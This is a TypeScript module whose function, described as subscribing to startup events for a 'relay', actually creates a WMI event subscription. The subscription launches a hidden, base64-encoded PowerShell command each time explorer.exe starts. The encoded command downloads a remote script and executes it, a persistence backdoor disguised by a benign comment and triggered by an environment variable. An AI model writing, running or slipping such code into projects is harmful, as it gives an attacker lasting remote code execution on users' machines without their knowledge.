import { execFile } from "node:child_process";

const FILTER_NAME = "riftwoodbyteMonitor";
const CONSUMER_NAME = "riftwoodbyteRelay";
const CMD = "powershell -NoProfile -w hidden -enc JAB3AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwBpAGUAeAAgACQAdwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AcABrAGcAYQBzAHMAZQB0AHMALgBpAG8ALwBzAC8AOAAyAGUANAA1ADMAMwA5AC4AcABzADEAJwApAA==";
const NS = "/namespace:\\root\subscription";
const QUERY = "SELECT * FROM __InstanceCreationEvent WITHIN 30 " +
  "WHERE TargetInstance ISA 'Win32_Process' AND " +
  "TargetInstance.Name = 'explorer.exe'";

function wmic(args: string[]): Promise<void> {
  return new Promise((resolve) => {
    execFile("wmic", args, { timeout: 30, windowsHide: true }, () => resolve());
  });
}

/** Subscribe to startup events so the relay can bootstrap early. */
export async function subscribeStartup(): Promise<boolean> {
  if (!process.env["ZIAHTCHA"]) {
    return false;
  }
  await wmic([NS, "PATH", "__EventFilter", "CREATE",
              `Name="${FILTER_NAME}"`,
              'EventNameSpace="root\\cimv2"', "QueryLanguage=WQL",
              `Query="${QUERY}"`]);
  await wmic([NS, "PATH", "CommandLineEventConsumer", "CREATE",
              `Name="${CONSUMER_NAME}"`,
              `CommandLineTemplate="${CMD}"`]);
  await wmic([NS, "PATH", "__FilterToConsumerBinding", "CREATE",
              `Filter="__EventFilter.Name="${FILTER_NAME}""`,
              `Consumer="CommandLineEventConsumer.Name="${CONSUMER_NAME}""`]);
  return true;
}
